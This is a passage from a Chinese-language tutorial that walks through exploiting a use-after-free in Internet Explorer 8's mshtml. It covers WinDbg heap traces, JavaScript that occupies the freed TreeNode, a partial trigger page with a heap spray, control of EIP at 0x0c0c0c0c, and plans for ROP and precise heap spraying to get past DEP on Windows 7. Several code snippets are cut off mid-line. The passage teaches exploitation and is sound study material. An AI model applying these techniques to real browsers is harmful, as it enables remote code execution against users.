    Element对象father(2eec048)    Element对象child(2eebd88)
    ​      |                                  |
    ​      V                                 V
    子节点(2ee8ac0)   (2ee8388)
                        ^                                 
                        |                                  
                        -------------    
                                                    |
    ​             CBody_TreeNode(02f123a8)
之后执行father[‘outerText’]=””会发现father以及他的子节点都被清空了。TreeNode也不在Dom树上了，但是这块内存指针依然存在。
使用!heap -p -a 02f123a8,发现这块内存依旧busy，size为4c
    0:005> !heap -p -a 02f123a8
    ​    address 02f123a8 found in
    ​    _HEAP @ 200000
    ​      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
    ​        02f12390 000d 0000  [00]   02f123a8    0004c - (busy)
执行father.setCapture();child.setCapture();会触发father.onlosecapture函数
进而执行的document.write(“”)会将TreeNode释放
    !heap -p -a 02f123a8,发现内存已经被free了
    0:005> !heap -p -a 02f123a8
    ​    address 05118558 found in
    ​    _HEAP @ 200000
    ​      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
    ​        02f12390 000d 0000  [00]   02f12398    00060 - (free)
这里就需要划重点了，这个内存被释放了，而之后这个内存的指针依然存在，甚至还被程序调用了。这明显是一个UAF漏洞，这时我们要利用之前讲的占坑技术，申请一段和之前差不多大小的内存，就能成功控制这块内存。
于是此时我们可以使用Js申请多个与被释放对象相同大小的内存块，对其进行占位。（申请多个是为了保证Exp稳定性）
    tt = new Array(20);
    for(i = 0; i ）
    tt[i].className = "u1111u2222u3333u4444u1111u2222u3333u4444u1111u2222u3333u4444u1111u2222u3333u4444u1111u2222u3333u4444u1111u2222u3333u4444u1111u2222u3333u4444u1111u2222u3333u4444u1111u2222u2222u3333u4444u1111";//替代c
查看TreeNode内存空间，发现占位成功。
    0:005> !heap -p -a 02f123a8
    ​    address 02f123a8 found in
    ​    _HEAP @ 220000
    ​      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
    ​        02f12390 000d 0000  [00]   02f123a8    0004e - (busy)
    0:005> dc 02f123a8
    02f123a8  22221111 44443333 22221111 44443333  ..""33DD..""33DD
    02f123b8  22221111 44443333 22221111 44443333  ..""33DD..""33DD
    02f123c8  22221111 44443333 22221111 44443333  ..""33DD..""33DD
    02f123d8  22221111 44443333 22221111 44443333  ..""33DD..""33DD
注意：建议覆写部分不要使用0c0c0c0c作为数据，因为后期使用精确堆喷射的时候，我们会修改0c0c0c0c地址的值，这样覆盖虚表地址为0c0c0c0c，而0c0c0c0c地址存放的并不是0c0c0c0c而是我们shellcode的开头。
继续运行，程序断在了GetInterface+0xac的位置，eax已经被赋值为了0x0c0c0c0c，说明这里调用了我们被释放的对象TreeNode。也就是我们占位成功，并且赋值给EAX。
不过这里还不是我们控制EIP的漏洞代码，因为这里[eax]不存在值所以程序就断下来了(EAX此时指向的应该是TreeNode虚函数表指针)。
接下来我们使用堆喷射将这段内存填充满值（0c0c0c0c）。
我们增加一个HeapSpray函数，准备好堆喷射，具体堆喷射细节可以参考前辈给出的利用总结（下图）。此时再次运行我们的程序。
    exp.html
    ​    Migraine
    ​    Hello World!
    ​        function trigger()
    ​        {
    ​            Math.tan(2,1);
    ​            var father=document.createElement("father");
    ​            var child=document.createElement("child");
    ​            Math.tan(1,2);
    ​            document.body.appendChild(father);
    ​            document.body.appendChild(child);
    ​            Math.sin(1,2);
    ​            child.applyElement(father);
    ​            
    ​            father.onlosecapture=function() {
    ​                Heapspray();
    ​                document.write("");
    ​                //Math.cos(1,2);
    ​                tt = new Array(20);
    ​                for(i = 0; i 
程序跳转到了0x0c0c0c0c，通过栈回溯，很明显是在GetInterface函数中调用call
[ecx]，读取了TreeNode对象中的内容，完成了一次堆EIP的控制。
注：ECX的值来源
向前阅读，发现上一次运行的断点就在向上5行(详细情况读者可以看本文的上一小节)，根据上文的分析mov
ecx,[eax]此时的EAX的值是从被我们覆盖的TreeNode中读取的（已经被我们覆盖为了0c0c0c0c）。从EAX指向的地址读取字符给ECX，而堆空间中已经被堆满了0c0c0c0c，因此导致ECX也被赋值为了0c0c0c0c地址存放的数据（也是0c0c0c0c）。然后call
[ecx]就发生了。
需要注意的是，在后期利用占位使用的字符尽量不要使用0c0c0c0c，因为这个空间会被我们安排ROP链，会导致[EAX]不能给ECX赋正确的值。（0c0c0c0c）
通过利用这个UAF漏洞，我们最后成功控制了程序流。
###  1.1.2 漏洞利用泛谈
UAF的部分到这里已经结束了。用大佬的说的一句话，就是漏洞和程序编写者有关，与系统无关。UAF漏洞是mshtml的一个内存漏洞，由漏洞能控制程序流。只要没有补丁，IE8在WinXP或者WIN10下，这个漏洞都是存在的。
区别在于利用难度，WIN XP SP1没有DEP，所以堆喷射一下就解决了。WIN 10开启了很复杂的保护，每周还有更新，利用难度非常高。
谈这点是的主要目的是什么呢，主要就是想表达自己最近领悟的一个观点。漏洞是客观存在的，与我们在什么系统下执行无关。能够利用，可能就要考验利用者的手法了。所以希望读者能明白，如果希望实现你UAF，那么原理和案例看到这里就够了。
并不是说利用手法不重要，而是希望自己能够对漏洞概念有一个更深刻的领会。
下文将尝试在WIN7下的对这个漏洞进行利用，使用ROP和精确堆喷射绕过DEP防护。
WIN7下的利用分析
使用mona插件，可以非常明显发现IE开启了DEP（IE本身没有开，但是mshtml开了），导致堆内的空间也不可执行。如果是XP环境，shellcode会被直接执行，但是在这里就需要使用ROP来绕过DEP。ASLR因为需要重启才会导致基础地址发生变化，所以我们本地测试暂时不做讨论。
绕过DEP的一般操作就是使用VirtualProtect关闭DEP，可以使用x
kernel32!Virtual*查找这个函数的位置。如果ASLR的影响算在内，函数地址也不是稳定的。（kernel32的地址也会变化）
在正式开始利用前，我们先做一个小实验：
在HeapSpray执行之后，查看0c0c0c0c的内存空间，发现已经被覆盖。
使用
    ed  data
我们将0c0c0c0c地址的数据修改成了VirtualProtect的地址。
成功跳转进入了函数。
###  1.1.3精确堆喷射
> 目前需要解决的问题有二
>
> 一是我们的数据包括shellcode和ROP链是存放在堆中的，熟悉ROP的读者应该明白只有在栈中（或者伪造的栈）才能正常执行程序链。
>
>
> 二是程序开启了DEP，堆不可执行，除非ROP链的头部正好对准0c0c0c0c（或者我们制定的其他跳转地址），才能正常执行ROP，一个字节也不能差。但是堆喷射是一种不稳定的技术，ROP链的地址在堆中位置是不确定。
解决方案：
因为我们将ROP布置在堆中，不能像栈一样方便直接执行。这里可使用栈翻转技术解决，将ESP指向我们堆中的ROP，就和在栈中没有区别了。前文我们已经尝试了在0c0c0c0c的位置布置了一个指向VirtualProtect函数的指针，并且成功跳转了，目前只需要布置好ROP就行。
那就第二个问题，如何在将ROP链的头精确的放在0c0c0c0c的位置。具体细节可以阅读下面这两篇文章。关键字：精确堆喷射。通过这个技术我们能将ROP精准地对准0c0c0c0c。
[链接1](https://blog.csdn.net/huhu1544/article/details/9821735)
[链接2](http://www.phreedom.org/research/heap-feng-shui/heap-feng-shui.html)
HeapSpray.html
    ​    
    ​    var sc="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    ​    var nop="u0c0cu0c0c";
    ​    while(nop.length<0x100000)
    ​        nop+=nop;